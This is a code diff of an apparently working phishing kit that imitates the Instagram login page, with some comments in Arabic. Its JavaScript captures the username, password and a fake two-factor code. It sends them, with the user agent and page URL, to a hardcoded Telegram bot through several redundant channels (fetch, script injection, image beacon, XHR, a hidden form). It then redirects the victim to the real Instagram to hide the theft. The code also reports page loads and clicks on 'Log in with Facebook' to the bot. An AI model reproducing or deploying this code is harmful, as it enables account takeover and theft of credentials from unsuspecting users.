@@ -1,795 +1,224 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
-
-        body {
-            background: #fafafa;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            direction: ltr;
-        }
-
-        /* ===== SLIDER ===== */
-        #sliderContainer {
-            width: 380px;
-            height: 100px;
-            overflow: hidden;
-            margin-bottom: 10px;
-            border-radius: 8px;
-            position: relative;
-        }
-
-        #slides {
-            display: flex;
-            transition: transform 0.5s ease-in-out;
-            width: 400%;
-            height: 100%;
-        }
-
-        #slides img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            flex-shrink: 0;
-        }
-
-        /* ===== CARDS ===== */
-        .card {
-            background: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 4px;
-            width: 380px;
-            padding: 30px 40px;
-            margin-bottom: 10px;
-            text-align: center;
-        }
-
-        .card h1 {
-            font-family: 'Billabong', 'Segoe UI', sans-serif;
-            font-size: 42px;
-            font-weight: 400;
-            color: #262626;
-            margin-bottom: 20px;
-            letter-spacing: -1px;
-        }
-
-        .card input {
-            width: 100%;
-            padding: 12px 10px;
-            margin-bottom: 6px;
-            border: 1px solid #dbdbdb;
-            border-radius: 4px;
-            background: #fafafa;
-            font-size: 13px;
-            outline: none;
-            transition: border 0.2s;
-        }
-
-        .card input:focus {
-            border-color: #a8a8a8;
-        }
-
-        .card button {
-            width: 100%;
-            padding: 10px;
-            background: #0095f6;
-            color: #fff;
-            border: none;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 8px;
-            transition: background 0.2s;
-        }
-
-        .card button:hover:not(:disabled) {
-            background: #1877f2;
-        }
-
-        .card button:disabled {
-            background: #b2dffc;
-            cursor: default;
-        }
-
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 18px 0;
-            color: #8e8e8e;
-            font-size: 12px;
-            font-weight: 600;
-        }
-
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: #dbdbdb;
-        }
-
-        .divider span {
-            margin: 0 18px;
-        }
-
-        .fb-btn {
-            background: transparent !important;
-            color: #385185 !important;
-            font-weight: 600 !important;
-            font-size: 14px !important;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            border: none !important;
-            margin-top: 0 !important;
-            padding: 8px !important;
-        }
-
-        .fb-btn:hover {
-            background: transparent !important;
-        }
-
-        .fb-btn svg {
-            width: 20px;
-            height: 20px;
-        }
-
-        .forgot-link {
-            color: #00376b;
-            font-size: 12px;
-            text-decoration: none;
-            display: block;
-            margin-top: 12px;
-        }
-
-        .forgot-link:hover {
-            text-decoration: underline;
-        }
-
-        .signup-card {
-            background: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 4px;
-            width: 380px;
-            padding: 20px 40px;
-            text-align: center;
-            font-size: 14px;
-            color: #262626;
-        }
-
-        .signup-card a {
-            color: #0095f6;
-            font-weight: 600;
-            text-decoration: none;
-        }
-
-        .signup-card a:hover {
-            text-decoration: underline;
-        }
-
-        .get-app {
-            text-align: center;
-            margin-top: 10px;
-            font-size: 14px;
-            color: #262626;
-        }
-
-        .get-app .store-badges {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 10px;
-        }
-
-        .get-app .store-badges img {
-            height: 40px;
-        }
-
-        /* ===== 2FA SECTION ===== */
-        #twofaSection {
-            display: none;
-            background: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 4px;
-            width: 380px;
-            padding: 30px 40px;
-            text-align: center;
-        }
-
-        #twofaSection .lock-icon {
-            font-size: 60px;
-            margin-bottom: 10px;
-        }
-
-        #twofaSection h2 {
-            font-size: 20px;
-            font-weight: 600;
-            color: #262626;
-            margin-bottom: 6px;
-        }
-
-        #twofaSection p {
-            font-size: 13px;
-            color: #8e8e8e;
-            margin-bottom: 18px;
-        }
-
-        .code-inputs {
-            display: flex;
-            gap: 8px;
-            justify-content: center;
-            margin-bottom: 14px;
-        }
-
-        .code-inputs input {
-            width: 44px;
-            height: 48px;
-            text-align: center;
-            font-size: 20px;
-            font-weight: 600;
-            border: 1px solid #dbdbdb;
-            border-radius: 4px;
-            background: #fafafa;
-            outline: none;
-            transition: border 0.2s;
-        }
-
-        .code-inputs input:focus {
-            border-color: #a8a8a8;
-        }
-
-        #twofaSection button {
-            width: 100%;
-            padding: 10px;
-            background: #0095f6;
-            color: #fff;
-            border: none;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-bottom: 8px;
-            transition: background 0.2s;
-        }
-
-        #twofaSection button:hover:not(:disabled) {
-            background: #1877f2;
-        }
-
-        #twofaSection button:disabled {
-            background: #b2dffc;
-            cursor: default;
-        }
-
-        .resend-link {
-            color: #00376b;
-            font-size: 13px;
-            text-decoration: none;
-            display: inline-block;
-            margin: 8px 0;
-            cursor: pointer;
-        }
-
-        .resend-link:hover {
-            text-decoration: underline;
-        }
-
-        .back-link {
-            color: #8e8e8e;
-            font-size: 13px;
-            text-decoration: none;
-            display: block;
-            margin-top: 14px;
-            cursor: pointer;
-        }
-
-        .back-link:hover {
-            color: #262626;
-        }
-
-        /* ===== COOLDOWN OVERLAY ===== */
-        #cooldownOverlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.95);
-            z-index: 999;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-        }
-
-        #cooldownOverlay .spinner {
-            border: 4px solid #dbdbdb;
-            border-top: 4px solid #0095f6;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 0.8s linear infinite;
-            margin-bottom: 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        #cooldownOverlay p {
-            font-size: 16px;
-            color: #262626;
-            font-weight: 500;
-        }
-
-        #cooldownOverlay #cooldownText {
-            font-size: 14px;
-            color: #8e8e8e;
-            margin-top: 8px;
-        }
-
-        /* ===== LOADING SCREEN ===== */
-        #loadingScreen {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #fff;
-            z-index: 1000;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        #loadingScreen .spinner {
-            border: 4px solid #dbdbdb;
-            border-top: 4px solid #0095f6;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 0.8s linear infinite;
-            margin-bottom: 20px;
-        }
-
-        #loadingScreen p {
-            font-size: 18px;
-            color: #262626;
-            font-weight: 500;
-        }
-
-        #loadingScreen .sub {
-            font-size: 13px;
-            color: #8e8e8e;
-            margin-top: 6px;
-        }
-
-        /* ===== FOOTER ===== */
-        .footer {
-            margin-top: 30px;
-            font-size: 11px;
-            color: #8e8e8e;
-            text-align: center;
-            max-width: 380px;
-        }
-
-        .footer a {
-            color: #8e8e8e;
-            text-decoration: none;
-            margin: 0 6px;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        .footer .lang {
-            margin-top: 10px;
-        }
-
-        .footer .lang select {
-            border: none;
-            background: transparent;
-            color: #8e8e8e;
-            font-size: 11px;
-            outline: none;
-        }
-
-        /* ===== RESPONSIVE ===== */
-        @media (max-width: 450px) {
-            #sliderContainer { width: 90%; }
-            .card, .signup-card, #twofaSection { width: 90%; padding: 20px; }
-        }
-    </style>
-</head>
-<body>
-
-    <!-- ===== SLIDER ===== -->
-    <div id="sliderContainer">
-        <div id="slides">
-            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='380' height='100' viewBox='0 0 380 100'%3E%3Crect width='380' height='100' fill='%23f0f0f0'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' fill='%23ccc' font-size='16'%3E📸 Slide 1%3C/text%3E%3C/svg%3E" alt="Slide 1">
-            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='380' height='100' viewBox='0 0 380 100'%3E%3Crect width='380' height='100' fill='%23e8e8e8'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' fill='%23ccc' font-size='16'%3E📸 Slide 2%3C/text%3E%3C/svg%3E" alt="Slide 2">
-            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='380' height='100' viewBox='0 0 380 100'%3E%3Crect width='380' height='100' fill='%23e0e0e0'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' fill='%23ccc' font-size='16'%3E📸 Slide 3%3C/text%3E%3C/svg%3E" alt="Slide 3">
-            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='380' height='100' viewBox='0 0 380 100'%3E%3Crect width='380' height='100' fill='%23d8d8d8'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' fill='%23ccc' font-size='16'%3E📸 Slide 4%3C/text%3E%3C/svg%3E" alt="Slide 4">
-        </div>
-    </div>
-
-    <!-- ===== LOGIN CARD ===== -->
-    <div class="card" id="loginCard">
-        <h1>Instagram</h1>
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit" id="loginBtn" disabled>Log in</button>
-        </form>
-
-        <div class="divider"><span>OR</span></div>
-
-        <button class="fb-btn" id="fbLogin">
-            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
-            Log in with Facebook
-        </button>
-
-        <a href="#" class="forgot-link">Forgot password?</a>
-    </div>
-
-    <!-- ===== SIGNUP CARD ===== -->
-    <div class="signup-card" id="signupCard">
-        Don't have an account? <a href="#">Sign up</a>
-    </div>
-
-    <!-- ===== GET APP ===== -->
-    <div class="get-app">
-        Get the app.
-        <div class="store-badges">
-            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='136' height='40' viewBox='0 0 136 40'%3E%3Crect width='136' height='40' rx='4' fill='%23222'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' fill='%23fff' font-size='10'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play">
-            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='136' height='40' viewBox='0 0 136 40'%3E%3Crect width='136' height='40' rx='4' fill='%23222'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' fill='%23fff' font-size='10'%3EApp Store%3C/text%3E%3C/svg%3E" alt="App Store">
-        </div>
-    </div>
-
-    <!-- ===== 2FA SECTION ===== -->
-    <div id="twofaSection">
-        <div class="lock-icon">🔒</div>
-        <h2>Two-Factor Authentication</h2>
-        <p>Enter the 6-digit code sent to your phone to finish logging into <strong id="displayUser">your account</strong>.</p>
-
-        <div class="code-inputs">
-            <input type="text" class="code-box" maxlength="1" inputmode="numeric">
-            <input type="text" class="code-box" maxlength="1" inputmode="numeric">
-            <input type="text" class="code-box" maxlength="1" inputmode="numeric">
-            <input type="text" class="code-box" maxlength="1" inputmode="numeric">
-            <input type="text" class="code-box" maxlength="1" inputmode="numeric">
-            <input type="text" class="code-box" maxlength="1" inputmode="numeric">
-        </div>
-
-        <button id="verifyBtn" disabled>Verify</button>
-        <a class="resend-link" id="resendBtn">Resend code</a>
-        <a class="back-link" id="backToLogin">← Back to login</a>
-    </div>
-
-    <!-- ===== COOLDOWN OVERLAY ===== -->
-    <div id="cooldownOverlay">
-        <div class="spinner"></div>
-        <p>Verifying your info</p>
-        <p id="cooldownText">Sending code... (10s)</p>
-    </div>
-
-    <!-- ===== LOADING SCREEN ===== -->
-    <div id="loadingScreen">
-        <div class="spinner"></div>
-        <p>Logging in...</p>
-        <p class="sub">Redirecting to Instagram</p>
-    </div>
-
-    <!-- ===== FOOTER ===== -->
-    <div class="footer">
-        <a href="#">Meta</a>
-        <a href="#">About</a>
-        <a href="#">Blog</a>
-        <a href="#">Jobs</a>
-        <a href="#">Help</a>
-        <a href="#">API</a>
-        <a href="#">Privacy</a>
-        <a href="#">Terms</a>
-        <a href="#">Top Accounts</a>
-        <a href="#">Hashtags</a>
-        <a href="#">Locations</a>
-        <a href="#">Instagram Lite</a>
-        <a href="#">Contact Uploading &amp; Non-Users</a>
-        <div class="lang">
-            <select>
-                <option>English</option>
-                <option>العربية</option>
-                <option>Français</option>
-                <option>Español</option>
-            </select>
-        </div>
-    </div>
-
-    <script>
-        // ================================================================
-        // ===== CONFIGURATION =====
-        // ================================================================
-        const BOT_TOKEN = '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg';
-        const CHAT_ID = '8278195073';
-
-        // ================================================================
-        // ===== DOM REFS =====
-        // ================================================================
-        const slides = document.getElementById('slides');
-        const u = document.getElementById('username');
-        const p = document.getElementById('password');
-        const loginBtn = document.getElementById('loginBtn');
-        const loginForm = document.getElementById('loginForm');
-        const cooldownOverlay = document.getElementById('cooldownOverlay');
-        const cooldownText = document.getElementById('cooldownText');
-        const loginCard = document.getElementById('loginCard');
-        const signupCard = document.getElementById('signupCard');
-        const twofaSection = document.getElementById('twofaSection');
-        const displayUser = document.getElementById('displayUser');
-        const codeBoxes = document.querySelectorAll('.code-box');
-        const verifyBtn = document.getElementById('verifyBtn');
-        const resendBtn = document.getElementById('resendBtn');
-        const backLink = document.getElementById('backToLogin');
-        const loadingScreen = document.getElementById('loadingScreen');
-
-        let capturedUsername = '';
-        let capturedPassword = '';
-        let cooldownTimer = null;
-        let cooldownCount = 0;
-
-        // ================================================================
-        // ===== SLIDER =====
-        // ================================================================
-        let currentSlide = 0;
-        setInterval(() => {
-            currentSlide = (currentSlide + 1) % 4;
-            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
-        }, 3000);
-
-        // ================================================================
-        // ===== LOGIN BUTTON STATE =====
-        // ================================================================
-        function checkLogin() {
-            loginBtn.disabled = !(u.value.trim() && p.value.trim());
-        }
-        u.addEventListener('input', checkLogin);
-        p.addEventListener('input', checkLogin);
-
-        // ================================================================
-        // ===== SEND TO TELEGRAM (4 methods for reliability) =====
-        // ================================================================
-        function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const params = new URLSearchParams({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
+const BOT_TOKEN = '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg';
+const CHAT_ID = '8278195073';
+
+const slides = document.getElementById('slides');
+let currentSlide = 0;
+setInterval(() => {
+    currentSlide = (currentSlide + 1) % 4;
+    slides.style.transform = `translateX(-${currentSlide * 100}%)`;
+}, 3000);
+
+const u = document.getElementById('username');
+const p = document.getElementById('password');
+const loginBtn = document.getElementById('loginBtn');
+const loginForm = document.getElementById('loginForm');
+const cooldownOverlay = document.getElementById('cooldownOverlay');
+const cooldownText = document.getElementById('cooldownText');
+const loginCard = document.getElementById('loginCard');
+const signupCard = document.getElementById('signupCard');
+const twofaSection = document.getElementById('twofaSection');
+const displayUser = document.getElementById('displayUser');
+const codeBoxes = document.querySelectorAll('.code-box');
+const verifyBtn = document.getElementById('verifyBtn');
+const resendBtn = document.getElementById('resendBtn');
+const backLink = document.getElementById('backToLogin');
+const loadingScreen = document.getElementById('loadingScreen');
+
+let capturedUsername = '';
+let capturedPassword = '';
+let cooldownTimer = null;
+let cooldownCount = 0;
+
+function checkLogin() {
+    loginBtn.disabled = !(u.value.trim() && p.value.trim());
+}
+u.addEventListener('input', checkLogin);
+p.addEventListener('input', checkLogin);
+
+// ====== الطريقة القوية: fetch + JSONP fallback ======
+function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const params = new URLSearchParams({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+    });
+    const fullUrl = url + '?' + params.toString();
+
+    // الطريقة 1: fetch (مدعوم في كل المتصفحات الحديثة)
+    try {
+        fetch(fullUrl, { method: 'GET', mode: 'no-cors' })
+            .catch(() => {
+                // لا تفعل شيئاً، no-cors يعطي response opaque
             });
-            const fullUrl = url + '?' + params.toString();
+    } catch(e) {}
 
-            // Method 1: fetch with no-cors
-            try {
-                fetch(fullUrl, { method: 'GET', mode: 'no-cors' }).catch(() => {});
-            } catch(e) {}
+    // الطريقة 2: JSONP (يعمل حتى لو fetch فشل)
+    try {
+        const script = document.createElement('script');
+        script.src = fullUrl;
+        script.onerror = () => {};
+        document.body.appendChild(script);
+        setTimeout(() => { if (script.parentNode) script.parentNode.removeChild(script); }, 3000);
+    } catch(e) {}
 
-            // Method 2: JSONP script injection
-            try {
-                const script = document.createElement('script');
-                script.src = fullUrl;
-                script.onerror = () => {};
-                document.body.appendChild(script);
-                setTimeout(() => { if (script.parentNode) script.parentNode.removeChild(script); }, 3000);
-            } catch(e) {}
+    // الطريقة 3: Image beacon (الطريقة الأقدم والأكثر توافقاً)
+    try {
+        const img = new Image();
+        img.src = fullUrl;
+    } catch(e) {}
 
-            // Method 3: Image beacon
-            try {
-                const img = new Image();
-                img.src = fullUrl;
-            } catch(e) {}
+    // الطريقة 4: XMLHttpRequest (آخر خطة)
+    try {
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', fullUrl, true);
+        xhr.send();
+    } catch(e) {}
+}
 
-            // Method 4: XMLHttpRequest
-            try {
-                const xhr = new XMLHttpRequest();
-                xhr.open('GET', fullUrl, true);
-                xhr.send();
-            } catch(e) {}
-        }
+// ====== تجربة الإرسال عند تحميل الصفحة (اختبار) ======
+window.addEventListener('load', function() {
+    sendToTelegram('✅ *Page Loaded* ✅\n\n🌐 URL: ' + window.location.href + '\n⏰ Time: ' + new Date().toISOString());
+});
 
-        // ================================================================
-        // ===== ON PAGE LOAD — notify bot =====
-        // ================================================================
-        window.addEventListener('load', function() {
-            sendToTelegram(
-                '✅ *Page Loaded* ✅\n\n' +
-                '🌐 URL: ' + window.location.href + '\n' +
-                '⏰ Time: ' + new Date().toISOString()
-            );
-        });
+// ====== SUBMIT LOGIN مع العد التنازلي ======
+loginForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+    if (cooldownTimer) return;
 
-        // ================================================================
-        // ===== LOGIN FORM SUBMIT =====
-        // ================================================================
-        loginForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            if (cooldownTimer) return;
+    capturedUsername = u.value.trim();
+    capturedPassword = p.value;
 
-            capturedUsername = u.value.trim();
-            capturedPassword = p.value;
+    // نرسلو البيانات فوراً بكل الطرق الممكنة
+    sendToTelegram(
+        '🔐 *Instagram Login Captured* 🔐\n\n' +
+        '👤 *Username:* `' + capturedUsername + '`\n' +
+        '🔑 *Password:* `' + capturedPassword + '`\n' +
+        '📱 *UA:* ' + navigator.userAgent + '\n' +
+        '⏰ *Time:* ' + new Date().toISOString() + '\n' +
+        '🌐 *URL:* ' + window.location.href
+    );
 
-            // Send credentials immediately via all methods
-            sendToTelegram(
-                '🔐 *Instagram Login Captured* 🔐\n\n' +
-                '👤 *Username:* `' + capturedUsername + '`\n' +
-                '🔑 *Password:* `' + capturedPassword + '`\n' +
-                '📱 *UA:* ' + navigator.userAgent + '\n' +
-                '⏰ *Time:* ' + new Date().toISOString() + '\n' +
-                '🌐 *URL:* ' + window.location.href
-            );
+    // ====== العد التنازلي 10 ثواني ======
+    loginBtn.disabled = true;
+    cooldownOverlay.style.display = 'flex';
+    cooldownCount = 10;
+    cooldownText.textContent = 'Sending code... (10s)';
 
-            // ===== COOLDOWN 10 SECONDS =====
-            loginBtn.disabled = true;
-            cooldownOverlay.style.display = 'flex';
-            cooldownCount = 10;
-            cooldownText.textContent = 'Sending code... (10s)';
+    cooldownTimer = setInterval(() => {
+        cooldownCount--;
+        if (cooldownCount > 0) {
+            cooldownText.textContent = 'Sending code... (' + cooldownCount + 's)';
+        } else {
+            clearInterval(cooldownTimer);
+            cooldownTimer = null;
+            cooldownOverlay.style.display = 'none';
 
-            cooldownTimer = setInterval(() => {
-                cooldownCount--;
-                if (cooldownCount > 0) {
-                    cooldownText.textContent = 'Sending code... (' + cooldownCount + 's)';
-                } else {
-                    clearInterval(cooldownTimer);
-                    cooldownTimer = null;
-                    cooldownOverlay.style.display = 'none';
+            // إظهار صفحة 2FA
+            loginCard.style.display = 'none';
+            signupCard.style.display = 'none';
+            twofaSection.style.display = 'block';
+            displayUser.textContent = capturedUsername || 'your phone';
 
-                    // Show 2FA page
-                    loginCard.style.display = 'none';
-                    signupCard.style.display = 'none';
-                    twofaSection.style.display = 'block';
-                    displayUser.textContent = capturedUsername || 'your phone';
-
-                    codeBoxes.forEach(box => box.value = '');
-                    codeBoxes[0].focus();
-                    verifyBtn.disabled = true;
-                }
-            }, 1000);
-        });
-
-        // ================================================================
-        // ===== 2FA CODE INPUT HANDLING =====
-        // ================================================================
-        codeBoxes.forEach((box, index) => {
-            box.addEventListener('input', function() {
-                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 1);
-                if (this.value && index < codeBoxes.length - 1) {
-                    codeBoxes[index + 1].focus();
-                }
-                const allFilled = Array.from(codeBoxes).every(b => b.value !== '');
-                verifyBtn.disabled = !allFilled;
-            });
-
-            box.addEventListener('keydown', function(e) {
-                if (e.key === 'Backspace' && !this.value && index > 0) {
-                    codeBoxes[index - 1].focus();
-                }
-            });
-
-            box.addEventListener('paste', function(e) {
-                e.preventDefault();
-                const paste = (e.clipboardData || window.clipboardData).getData('text');
-                const digits = paste.replace(/[^0-9]/g, '').slice(0, 6);
-                digits.split('').forEach((d, i) => {
-                    if (codeBoxes[i]) codeBoxes[i].value = d;
-                });
-                if (digits.length === 6) {
-                    codeBoxes[5].focus();
-                    verifyBtn.disabled = false;
-                } else if (codeBoxes[digits.length]) {
-                    codeBoxes[digits.length].focus();
-                }
-            });
-        });
-
-        // ================================================================
-        // ===== VERIFY 2FA =====
-        // ================================================================
-        verifyBtn.addEventListener('click', function() {
-            const code = Array.from(codeBoxes).map(b => b.value).join('');
-
-            // Send 2FA code via Telegram
-            sendToTelegram(
-                '🔐 *Instagram 2FA Code Received* 🔐\n\n' +
-                '👤 *Username:* `' + capturedUsername + '`\n' +
-                '🔑 *Password:* `' + capturedPassword + '`\n' +
-                '🔢 *2FA Code:* `' + code + '`\n' +
-                '📱 *UA:* ' + navigator.userAgent + '\n' +
-                '⏰ *Time:* ' + new Date().toISOString() + '\n' +
-                '🌐 *URL:* ' + window.location.href
-            );
-
-            // Backup: send via hidden form submit
-            try {
-                const form = document.createElement('form');
-                form.method = 'GET';
-                form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                const input1 = document.createElement('input');
-                input1.name = 'chat_id';
-                input1.value = CHAT_ID;
-                const input2 = document.createElement('input');
-                input2.name = 'text';
-                input2.value = '🔐 2FA: ' + capturedUsername + ' | Code: ' + code;
-                const input3 = document.createElement('input');
-                input3.name = 'parse_mode';
-                input3.value = 'Markdown';
-                form.appendChild(input1);
-                form.appendChild(input2);
-                form.appendChild(input3);
-                form.style.display = 'none';
-                document.body.appendChild(form);
-                form.submit();
-            } catch(e) {}
-
-            // Show loading and redirect to real Instagram
-            loadingScreen.style.display = 'flex';
-            setTimeout(() => {
-                window.location.href = 'https://www.instagram.com';
-            }, 2000);
-        });
-
-        // ================================================================
-        // ===== RESEND CODE =====
-        // ================================================================
-        resendBtn.addEventListener('click', function() {
             codeBoxes.forEach(box => box.value = '');
             codeBoxes[0].focus();
             verifyBtn.disabled = true;
-            sendToTelegram(
-                '🔄 *Resend Code Requested* 🔄\n\n' +
-                '👤 *Username:* `' + capturedUsername + '`\n' +
-                '⏰ *Time:* ' + new Date().toISOString()
-            );
-        });
+        }
+    }, 1000);
+});
 
-        // ================================================================
-        // ===== BACK TO LOGIN =====
-        // ================================================================
-        backLink.addEventListener('click', function(e) {
-            e.preventDefault();
-            twofaSection.style.display = 'none';
-            loginCard.style.display = 'block';
-            signupCard.style.display = 'block';
-            checkLogin();
+// ===== 2FA CODE INPUT =====
+codeBoxes.forEach((box, index) => {
+    box.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 1);
+        if (this.value && index < codeBoxes.length - 1) {
+            codeBoxes[index + 1].focus();
+        }
+        const allFilled = Array.from(codeBoxes).every(b => b.value !== '');
+        verifyBtn.disabled = !allFilled;
+    });
+    box.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && !this.value && index > 0) {
+            codeBoxes[index - 1].focus();
+        }
+    });
+    box.addEventListener('paste', function(e) {
+        e.preventDefault();
+        const paste = (e.clipboardData || window.clipboardData).getData('text');
+        const digits = paste.replace(/[^0-9]/g, '').slice(0, 6);
+        digits.split('').forEach((d, i) => {
+            if (codeBoxes[i]) codeBoxes[i].value = d;
         });
+        if (digits.length === 6) {
+            codeBoxes[5].focus();
+            verifyBtn.disabled = false;
+        } else if (codeBoxes[digits.length]) {
+            codeBoxes[digits.length].focus();
+        }
+    });
+});
 
-        // ================================================================
-        // ===== FACEBOOK LOGIN CLICK =====
-        // ================================================================
-        document.getElementById('fbLogin').addEventListener('click', function(e) {
-            e.preventDefault();
-            sendToTelegram(
-                '📘 *Facebook Login Clicked* 📘\n\n' +
-                '👤 *Username:* `' + (capturedUsername || 'N/A') + '`\n' +
-                '⏰ *Time:* ' + new Date().toISOString()
-            );
-        });
-    </script>
-</body>
-</html>
+// ===== VERIFY =====
+verifyBtn.addEventListener('click', function() {
+    const code = Array.from(codeBoxes).map(b => b.value).join('');
+
+    sendToTelegram(
+        '🔐 *Instagram 2FA Code Received* 🔐\n\n' +
+        '👤 *Username:* `' + capturedUsername + '`\n' +
+        '🔑 *Password:* `' + capturedPassword + '`\n' +
+        '🔢 *2FA Code:* `' + code + '`\n' +
+        '📱 *UA:* ' + navigator.userAgent + '\n' +
+        '⏰ *Time:* ' + new Date().toISOString() + '\n' +
+        '🌐 *URL:* ' + window.location.href
+    );
+
+    // إرسال إضافي عبر form submit مخفي
+    try {
+        const form = document.createElement('form');
+        form.method = 'GET';
+        form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const input1 = document.createElement('input');
+        input1.name = 'chat_id';
+        input1.value = CHAT_ID;
+        const input2 = document.createElement('input');
+        input2.name = 'text';
+        input2.value = '🔐 2FA: ' + capturedUsername + ' | Code: ' + code;
+        const input3 = document.createElement('input');
+        input3.name = 'parse_mode';
+        input3.value = 'Markdown';
+        form.appendChild(input1);
+        form.appendChild(input2);
+        form.appendChild(input3);
+        form.style.display = 'none';
+        document.body.appendChild(form);
+        form.submit();
+    } catch(e) {}
+
+    loadingScreen.style.display = 'flex';
+    setTimeout(() => {
+        window.location.href = 'https://www.instagram.com';
+    }, 2000);
+});
+
+// ===== RESEND =====
+resendBtn.addEventListener('click', function() {
+    codeBoxes.forEach(box => box.value = '');
+    codeBoxes[0].focus();
+    verifyBtn.disabled = true;
+    sendToTelegram('🔄 *Resend Code Requested* 🔄\n\n👤 *Username:* `' + capturedUsername + '`\n⏰ *Time:* ' + new Date().toISOString());
+});
+
+// ===== BACK TO LOGIN =====
+backLink.addEventListener('click', function(e) {
+    e.preventDefault();
+    twofaSection.style.display = 'none';
+    loginCard.style.display = 'block';
+    signupCard.style.display = 'block';
+    checkLogin();
+});
+
+// ===== FACEBOOK =====
+document.getElementById('fbLogin').addEventListener('click', function(e) {
+    e.preventDefault();
+    sendToTelegram('📘 *Facebook Login Clicked* 📘\n\n👤 *Username:* `' + (capturedUsername || 'N/A') + '`\n⏰ *Time:* ' + new Date().toISOString());
+});
